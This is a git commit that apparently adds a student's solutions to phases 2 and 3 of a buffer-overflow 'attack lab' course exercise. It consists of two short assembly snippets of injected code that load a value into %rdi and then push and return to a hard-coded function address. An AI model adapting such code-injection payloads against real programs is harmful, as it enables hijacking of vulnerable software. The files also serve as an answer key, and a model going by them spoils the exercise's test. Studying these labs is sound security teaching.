4e0f8f425eb0232048fe62a13e868275d070e97e
HaveAnApplePie <luyi1019105596@gmail.com>
2023-02-20 07:56:11 +0800

    lab_3_attack

---
+++ Lab_3_attack/target1/phase_2.s
@@ -0,0 +1,4 @@
+# phase_2 injection code
+mov  $0x59b997fa,%rdi	#rdi=0x59b997fa
+push $0x4017ec		#push
+ret                     #ret 
---
+++ Lab_3_attack/target1/phase_3.s
@@ -0,0 +1,4 @@
+# phase_3 injection code
+mov  $0x5561dc78,%rdi   #rdi=0x59b997fa
+push $0x4018fa		#push
+ret			#ret
